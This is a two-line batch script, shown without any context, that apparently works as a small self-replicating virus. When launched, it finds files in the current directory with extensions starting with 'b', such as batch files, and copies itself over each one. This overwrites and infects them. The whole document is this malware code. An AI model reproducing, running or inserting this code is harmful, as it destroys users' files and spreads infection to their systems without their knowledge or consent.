if "%1==" for %%i in (*.b*) do call %0 %%i
ren %1 *|copy %0 %1